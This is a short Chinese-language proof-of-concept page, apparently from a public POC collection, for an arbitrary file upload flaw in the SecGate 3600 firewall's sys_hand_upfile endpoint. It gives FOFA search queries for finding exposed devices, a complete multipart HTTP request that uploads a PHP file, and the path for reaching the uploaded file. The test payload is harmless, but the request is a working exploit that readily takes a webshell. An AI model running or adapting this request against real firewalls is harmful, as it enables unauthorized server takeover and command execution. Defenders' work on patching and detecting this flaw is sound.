## 网神SecGate 3600 防火墙sys_hand_upfile 任意文件上传漏洞

 网神 SecGate 3600 防火墙 sys_hand_upfile 存在任意文件上传漏洞，攻击者可构造特殊 HTTP 请求上传任意文件获取服务器权限，执行恶意命令等。

 ## fofa
 ```
body="./images/lsec/login/loading.gif"
title="网神SecGate 3600防火墙"
```

## poc
```
POST /?g=sys_hand_upfile HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/3.0)
Content-Length: 244
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: multipart/form-data; boundary=gttd4i4aadwh9lmlp1ez
 
--gttd4i4aadwh9lmlp1ez
Content-Disposition: form-data; name="upfile"; filename="ceshi.php"
 
<?php echo md5('666');unlink(__FILE__);?>
--gttd4i4aadwh9lmlp1ez
Content-Disposition: form-data; name="submit_post"
 
sys_hand_upfile
--gttd4i4aadwh9lmlp1ez--
```

![image](https://github.com/wy876/POC/assets/139549762/6ba66f9f-affd-4600-ac29-2cfe98502b45)

访问文件路径
http//127.0.0.1/attachements/ceshi.php
